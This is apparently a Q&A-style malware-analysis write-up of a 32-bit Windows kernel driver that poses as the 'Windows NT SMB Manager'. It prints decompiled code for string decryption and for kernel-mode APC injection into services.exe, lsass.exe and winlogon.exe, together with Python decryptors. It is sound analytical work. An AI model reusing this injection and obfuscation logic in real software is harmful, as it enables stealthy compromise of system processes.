## 1.What is the SHA256 of this sample?
```bash
sha256sum sample
980954a2440122da5840b31af7e032e8a25b0ce43e071ceb023cca21cedb2c43  sample
```

**980954a2440122da5840b31af7e032e8a25b0ce43e071ceb023cca21cedb2c43**

## 2.What type of executable is this sample?
use die reveal it is a driver

**driver**

## 3.This sample attempts to masquerade as a component of the system. Which system component is it attempting to masquerade as?
This is the main entry of driver
```bash
NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
  NTSTATUS result; // eax
  SIZE_T v3; // ebx
  PVOID Pool; // eax
  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [esp+4h] [ebp-28h] BYREF
  struct _CLIENT_ID ClientId; // [esp+1Ch] [ebp-10h] BYREF
  ULONG MinorVersion; // [esp+24h] [ebp-8h] BYREF
  ULONG MajorVersion; // [esp+28h] [ebp-4h] BYREF

  PsGetVersion(&MajorVersion, &MinorVersion, 0, 0);
  if ( MajorVersion > 5 )
    return -1073741637;
  DriverObject->DriverUnload = (PDRIVER_UNLOAD)unload_routine;
  v3 = RegistryPath->Length + 2;
  Pool = ExAllocatePool(NonPagedPool, v3);
  dword_12FA0 = Pool;
  if ( !Pool )
    return -1073741670;
  memset(Pool, 0, v3);
  memcpy(dword_12FA0, RegistryPath->Buffer, RegistryPath->Length);
  RtlInitUnicodeString(&DestinationString, (PCWSTR)dword_12FA0);
  KeInitializeEvent(&Event, NotificationEvent, 1u);
  ObjectAttributes.Length = 24;
  memset(&ObjectAttributes.RootDirectory, 0, 20);
  result = PsCreateSystemThread(&ThreadHandle, 0x1F03FFu, &ObjectAttributes, 0, &ClientId, StartRoutine, 0);
  if ( result >= 0 )
    return 0;
  return result;
}
```
The main code will be at `StartRoutine`

**Windows NT SMB Manager**

## 4.What is the Original Filename of the sample?
```bash
exiftool sample
ExifTool Version Number         : 13.25
File Name                       : sample
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2025:09:09 18:45:02+07:00
File Access Date/Time           : 2025:11:19 10:16:54+07:00
File Inode Change Date/Time     : 2025:11:19 10:13:37+07:00
File Permissions                : -rwxrwxrwx
File Type                       : Win32 EXE
File Type Extension             : exe
MIME Type                       : application/octet-stream
Machine Type                    : Intel 386 or later, and compatibles
Time Stamp                      : 2003:08:18 09:19:01+07:00
Image File Characteristics      : Executable, 32-bit
PE Type                         : PE32
Linker Version                  : 8.0
Code Size                       : 10496
Initialized Data Size           : 3328
Uninitialized Data Size         : 0
Entry Point                     : 0x0d14
OS Version                      : 6.0
Image Version                   : 6.0
Subsystem Version               : 5.0
Subsystem                       : Native
File Version Number             : 5.1.2600.2180
Product Version Number          : 5.1.2600.2180
File Flags Mask                 : 0x003f
File Flags                      : Private build
File OS                         : Windows NT 32-bit
Object File Type                : Driver
File Subtype                    : 7
Language Code                   : English (U.S.)
Character Set                   : Unicode
Company Name                    : Microsoft Corporation
File Description                : Windows NT SMB Manager
File Version                    : 5.1.2600.2180
Internal Name                   : mrxsmbmg.sys
```

**mrxsmbmg.sys**

## 5.This sample only runs on one type of system architecture, which one?
based on info from exiftool and die, we can confirm it's a 32bit driver

**32-bit**

## 6.This is targeted at specific versions of the Windows operating system. Which version of Windows will this sample not run on?
```bash
PsGetVersion(&MajorVersion, &MinorVersion, 0, 0);
if ( MajorVersion > 5 )
    return -1073741637;  // STATUS_NOT_SUPPORTED (0xC00000BB)
```
This mean it will not run on version above 6 (from window vista to window 11)

## 7.What Windows API does the sample use to execute the main function via Thread?
```bash
 result = PsCreateSystemThread(&ThreadHandle, 0x1F03FFu, &ObjectAttributes, 0, &ClientId, StartRoutine, 0);
  if ( result >= 0 )
    return 0;
  return result;
```

**PsCreateSystemThread**

## 8.With the goal of obfuscating certain capabilities, the sample implements an algorithm for decrypting strings at runtime. What is the seed of this algorithm?
```bash
P = decrypt_string(0xAA107FB, word_12EB0);
  v4 = decrypt_string(0xAA107FB, word_12E9C);
  v5 = decrypt_string(0xAA107FB, word_12ECC);
```

**0xAA107FB**

## 9.What are the first three strings (in order) that were decrypted?
```bash
PVOID __stdcall decrypt_string(int seed, const unsigned __int16 *Src)
{
  size_t str_len; // esi
  PVOID result; // eax
  PVOID dest_str; // edi

  str_len = 2 * wcslen(Src);
  result = ExAllocatePool(NonPagedPool, str_len + 2);
  dest_str = result;
  if ( result )
  {
    memset(result, 0, str_len + 2);
    memcpy(dest_str, Src, str_len);
    main_decrypt(seed, dest_str);
    return dest_str;
  }
  return result;
}
```
```bash
signed int __stdcall main_decrypt(int seed, const unsigned __int16 *enc_str)
{
  signed int result; // eax
  signed int i; // ecx

  result = wcslen(enc_str);
  for ( i = 0; i < result; ++i )
  {
    seed = 1664525 * seed + 1013904223;
    enc_str[i] ^= HIWORD(seed) | 0x8000;
  }
  return result;
}
```
it used Linear Congruential Generator (LCG) XOR to decrypt string
- decryptor
```bash
def decrypt_string(seed, encrypted_words):
    state = seed
    decrypted = []
    
    for word in encrypted_words:
        state = (1664525 * state + 1013904223) & 0xFFFFFFFF
        xor_key = (state >> 16) | 0x8000
        decrypted.append(chr(word ^ xor_key))
    
    return ''.join(decrypted)

seed = 178325499

# word_12E9C
enc1 = [0xB721, 0xF617, 0xA708, 0x9776, 0xDD8C, 0x9A65, 0xB631, 0xB596, 0x8585]
print("12E9C:", decrypt_string(seed, enc1))

# word_12EB0
enc2 = [0xB73E, 0xF601, 0xA71B, 0x9773, 0xDD96, 0x9A28, 0xB631, 0xB59D, 0x85CE, 0xDC3A, 0xF208, 0xA105]
print("12EB0:", decrypt_string(seed, enc2))

# word_12ECC
enc3 = [0xB73A, 0xF60D, 0xA707, 0x9769, 0xDD90, 0x9A2C, 0xB63B]
print("12ECC:", decrypt_string(seed, enc3))
```

**services.exe, lsass.exe, winlogon.exe**

## 10.This sample implements a process injection routine. What is the name of the injection technique implemented by this sample?
In `injection_func`, the malware decrypt some kernel api
```bash
MaxCount = decrypt_api_func(178325499, &unk_12F20);
  v17 = (void (__cdecl *)(int))decrypt_api_func(178325499, &unk_12F30);
  v18 = (int (__stdcall *)(int, char **, _DWORD, int *, int, int))decrypt_api_func(178325499, &unk_12F40);
  v2 = decrypt_api_func(178325499, &unk_12F58);
```
Check nested func and we have this code to decrypt
```bash
def decrypt_ascii_string(seed, encrypted_bytes):
    """
    Decrypt EquationDrug ASCII strings (sub_11482)
    XORs with BYTE2(state) | 0x80
    """
    state = seed
    decrypted = []
    
    for byte in encrypted_bytes:
        if byte == 0:
            break
        state = (1664525 * state + 1013904223) & 0xFFFFFFFF
        xor_key = ((state >> 16) & 0xFF) | 0x80
        decrypted.append(chr(byte ^ xor_key))
    
    return ''.join(decrypted)

seed = 178325499

# unk_12F20 (inject_func+3A) - 1st
enc_12F20 = [0x86, 0x81, 0xA8, 0xF1, 0x8B, 0xAA, 0xB7, 0x86, 0xB0, 0xAD, 0x9F, 0x83, 0x9B, 0xB8, 0xFE]

# unk_12F30 (inject_func+4D) - 2nd
enc_12F30 = [0x86, 0x81, 0xAD, 0xE0, 0x8B, 0xAA, 0xB7, 0x86, 0xB0, 0xAD, 0x9F, 0x83, 0x9B, 0xB8, 0xFE]

# unk_12F40 (inject_func+5B) - 3rd
enc_12F40 = [0x97, 0x93, 0xA8, 0xE9, 0x93, 0xA4, 0xB7, 0x8F, 0x94, 0xBA, 0xA6, 0x89, 0x8C, 0xBF, 0xF8, 0xCE, 0x97, 0xF8, 0xD7, 0x89, 0xF0, 0xB0, 0xB6]

# unk_12F58 (inject_func+69) - 4th
enc_12F58 = [0x97, 0x93, 0xAF, 0xF7, 0x9A, 0xAE, 0x82, 0x87, 0x92, 0xAB, 0x85, 0x81, 0x92, 0x86, 0xE8, 0xC2, 0x94, 0xC7, 0xCB]

print("=== inject_func Decrypted Strings ===")
r1 = decrypt_ascii_string(seed, enc_12F20)
r2 = decrypt_ascii_string(seed, enc_12F30)
r3 = decrypt_ascii_string(seed, enc_12F40)
r4 = decrypt_ascii_string(seed, enc_12F58)

print(f"1st - unk_12F20: {r1} ({len(r1)} chars)")
print(f"2nd - unk_12F30: {r2} ({len(r2)} chars)")
print(f"3rd - unk_12F40: {r3} ({len(r3)} chars)")
print(f"4th - unk_12F58: {r4} ({len(r4)} chars)")
```
The result
```bash
=== inject_func Decrypted Strings ===
1st - unk_12F20: KeAttachProcess (15 chars)
2nd - unk_12F30: KeDetachProcess (15 chars)
3rd - unk_12F40: ZwAllocateVirtualMemory (23 chars)
4th - unk_12F58: ZwFreeVirtualMemory (19 chars)
```
The injection code
```bash
NTSTATUS __stdcall inject_func(WCHAR *SourceString, wchar_t *Source)
{
  int ZwFreeVirtualMemory; // eax
  NTSTATUS v3; // esi
  NTSTATUS v5; // ebx
  _DWORD *Pool; // eax
  _DWORD *v7; // esi
  char *v8; // eax
  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [esp+Ch] [ebp-74h] BYREF
  struct _UNICODE_STRING DestinationString; // [esp+24h] [ebp-5Ch] BYREF
  struct _CLIENT_ID ClientId; // [esp+2Ch] [ebp-54h] BYREF
  PVOID v12; // [esp+34h] [ebp-4Ch]
  void (__stdcall *v13)(void *, char **, int *, int); // [esp+38h] [ebp-48h]
  int v14; // [esp+3Ch] [ebp-44h] BYREF
  int v15; // [esp+40h] [ebp-40h] BYREF
  PVOID Object; // [esp+44h] [ebp-3Ch] BYREF
  void (__cdecl *KerDetachProcess)(int); // [esp+48h] [ebp-38h]
  int (__stdcall *ZwAllocateVirtualMemory)(int, char **, _DWORD, int *, int, int); // [esp+4Ch] [ebp-34h]
  size_t MaxCount; // [esp+50h] [ebp-30h]
  PVOID v20; // [esp+54h] [ebp-2Ch] BYREF
  PVOID P; // [esp+58h] [ebp-28h]
  void *ProcessHandle; // [esp+5Ch] [ebp-24h] BYREF
  char *v23; // [esp+60h] [ebp-20h] BYREF
  char v24; // [esp+66h] [ebp-1Ah]
  char v25; // [esp+67h] [ebp-19h]
  CPPEH_RECORD ms_exc; // [esp+68h] [ebp-18h] BYREF

  v20 = 0;
  ProcessHandle = 0;
  v12 = 0;
  v24 = 0;
  v23 = 0;
  v14 = 0;
  v25 = 0;
  P = 0;
  if ( !SourceString || !Source )
    return -1073741811;
  MaxCount = decrypt_api_func(178325499, &KeAttachProcess_str);
  KerDetachProcess = (void (__cdecl *)(int))decrypt_api_func(178325499, &KeDetachProcess_str);
  ZwAllocateVirtualMemory = (int (__stdcall *)(int, char **, _DWORD, int *, int, int))decrypt_api_func(
                                                                                        178325499,
                                                                                        &ZwAllocateVirtualMemory_str);
  ZwFreeVirtualMemory = decrypt_api_func(178325499, &ZwFreeVirtualMemory_str);
  v13 = (void (__stdcall *)(void *, char **, int *, int))ZwFreeVirtualMemory;
  if ( !MaxCount || !KerDetachProcess || !ZwAllocateVirtualMemory || !ZwFreeVirtualMemory )
    return -1073741823;
  ms_exc.registration.TryLevel = 0;
  RtlInitUnicodeString(&DestinationString, SourceString);
  v3 = sub_11B78((int)&v20, (int)&SourceString, &DestinationString);
  if ( v3 < 0 )
  {
LABEL_8:
    local_unwind2(&ms_exc.registration, -1);
    return v3;
  }
  ClientId.UniqueProcess = SourceString;
  ClientId.UniqueThread = 0;
  ObjectAttributes.Length = 24;
  ObjectAttributes.RootDirectory = 0;
  ObjectAttributes.Attributes = 512;
  ObjectAttributes.ObjectName = 0;
  ObjectAttributes.SecurityDescriptor = 0;
  ObjectAttributes.SecurityQualityOfService = 0;
  v5 = ZwOpenProcess(&ProcessHandle, 0x1F0FFFu, &ObjectAttributes, &ClientId);
  if ( v5 >= 0 )
  {
    v3 = ObReferenceObjectByHandle(ProcessHandle, 0x1F0FFFu, 0, 0, &Object, 0);
    if ( v3 < 0 )
      goto LABEL_8;
    if ( SourceString != PsGetCurrentProcessId() )
    {
      ((void (__stdcall *)(PVOID))MaxCount)(Object);
      v24 = 1;
    }
    MaxCount = (char *)sub_10FB2 - (char *)sub_10F76;
    v15 = (char *)sub_10FB2 - (char *)sub_10F76 + (char *)sub_10F6C - (char *)sub_10F50 + 528;
    v3 = ZwAllocateVirtualMemory(-1, &v23, 0, &v15, 12288, 64);
    if ( v3 < 0 )
      goto LABEL_8;
    v25 = 1;
    Pool = ExAllocatePool(NonPagedPool, 0x210u);
    v7 = Pool;
    P = Pool;
    if ( Pool )
    {
      Source = (wchar_t *)sub_10FBC((int)Pool, Source);
      if ( (int)Source >= 0 )
      {
        v8 = v23 + 528;
        v7[1] = v23 + 528;
        Source = (wchar_t *)&v8[(char *)sub_10F6C - (char *)sub_10F50];
        qmemcpy(v23, v7, 0x210u);
        memcpy(v8, sub_10F50, 0x1Cu);
        memcpy(Source, sub_10F76, MaxCount);
        v3 = sub_11CCA(Source, v23, v20);
        if ( v3 < 0 )
          goto LABEL_8;
        v25 = 0;
        ms_exc.registration.TryLevel = -1;
        if ( P )
          ExFreePool(P);
        if ( v25 )
          v13(ProcessHandle, &v23, &v14, 0x8000);
        if ( v24 )
          KerDetachProcess(70585);
        if ( v12 )
          ObfDereferenceObject(v12);
        if ( ProcessHandle )
          ZwClose(ProcessHandle);
        if ( v20 )
          ObfDereferenceObject(v20);
        return 0;
      }
      else
      {
        local_unwind2(&ms_exc.registration, -1);
        return (NTSTATUS)Source;
      }
    }
    else
    {
      local_unwind2(&ms_exc.registration, -1);
      return -1073741670;
    }
  }
  else
  {
    local_unwind2(&ms_exc.registration, -1);
    return v5;
  }
}
```
```bash
KeAttachProcess(Object);           // Attach to target process context
ZwAllocateVirtualMemory(...);      // Allocate memory in target process
qmemcpy(v23, v7, 0x210u);          // Copy shellcode
memcpy(v8, sub_10F50, 0x1Cu);      // Copy more code
memcpy(Source, sub_10F76, MaxCount); // Copy more code
sub_11CCA(...);                    // Execute/queue APC
KeDetachProcess();                 // Detach from process
```

**apc injection**

## 11.What are the two APIs used by this sample to execute the injection technique?
```bash
int __stdcall main_apc_injection(int a1, int a2, int a3)
{
  const char *KeInitializeApc; // ebx
  const char *KeInsertQueueApc; // eax
  PVOID Pool; // eax
  const char *v7; // [esp+Ch] [ebp-4h]

  if ( !a1 || !a3 )
    return -1073741811;
  KeInitializeApc = decrypt_api_func(178325499, &unk_12F6C);
  KeInsertQueueApc = decrypt_api_func(178325499, &unk_12F7C);
  v7 = KeInsertQueueApc;
  if ( !KeInitializeApc || !KeInsertQueueApc )
    return -1073741823;
  Pool = ExAllocatePool(NonPagedPool, 0x30u);
  P = Pool;
  if ( !Pool )
    return -1073741670;
  ((void (__stdcall *)(PVOID, int, _DWORD, int (__stdcall *)(int, int, int, int, int), int (__stdcall *)(int), int, int, int))KeInitializeApc)(
    Pool,
    a3,
    0,
    sub_11CB2,
    nullsub_1,
    a1,
    1,
    a2);
  KeClearEvent(&Event);
  if ( !((unsigned __int8 (__stdcall *)(PVOID, _DWORD, _DWORD, _DWORD))v7)(P, 0, 0, 0) )
  {
    KeSetEvent(&Event, 0, 0);
    return -1073741823;
  }
  return 0;
}
```
decrypt api call
```bash
def decrypt_ascii_string(seed, encrypted_bytes):
    """Decrypt ASCII string (sub_114CC/sub_11482)"""
    state = seed
    decrypted = []
    for byte in encrypted_bytes:
        if byte == 0:
            break
        state = (1664525 * state + 1013904223) & 0xFFFFFFFF
        xor_key = ((state >> 16) & 0xFF) | 0x80
        decrypted.append(chr(byte ^ xor_key))
    return ''.join(decrypted)

seed = 178325499

# unk_12F6C (v3 - first API call)
enc_12F6C = [0x86, 0x81, 0xA0, 0xEB, 0x96, 0xBF, 0xBD, 0x8F, 0x8C, 0xB6, 0x8A, 0x85, 0xBF, 0xBB, 0xEE, 0x00]

# unk_12F7C (v7 - second API call)
enc_12F7C = [0x86, 0x81, 0xA0, 0xEB, 0x8C, 0xAE, 0xA6, 0x9A, 0xB1, 0xAA, 0x95, 0x95, 0x9B, 0x8A, 0xFD, 0xCC, 0x00]

r1 = decrypt_ascii_string(seed, enc_12F6C)
r2 = decrypt_ascii_string(seed, enc_12F7C)

print(f"unk_12F6C: {r1} ({len(r1)} chars)")
print(f"unk_12F7C: {r2} ({len(r2)} chars)")
```
```bash
unk_12F6C: KeInitializeApc (15 chars)
unk_12F7C: KeInsertQueueApc (16 chars)
```
****

## 12.A shellcode will be injected using the technique identified in the previous question. This shellcode will load a module into the injected memory. What is the name of this module?
```bash
def decrypt_wide_string(seed, encrypted_words):
    """Decrypt wide string (decrypt_string)"""
    state = seed
    decrypted = []
    for word in encrypted_words:
        if word == 0:
            break
        state = (1664525 * state + 1013904223) & 0xFFFFFFFF
        xor_key = (state >> 16) | 0x8000
        decrypted.append(chr(word ^ xor_key))
    return ''.join(decrypted)

seed = 178325499

# word_12E84
enc_12E84 = [0xB720, 0xF617, 0xA71F, 0x9766, 0xDD8F, 0x9A7C, 0xB667]

result = decrypt_wide_string(seed, enc_12E84)
print(f"word_12E84: {result}")
print(f"Length: {len(result)} chars")
```

**msvcp73**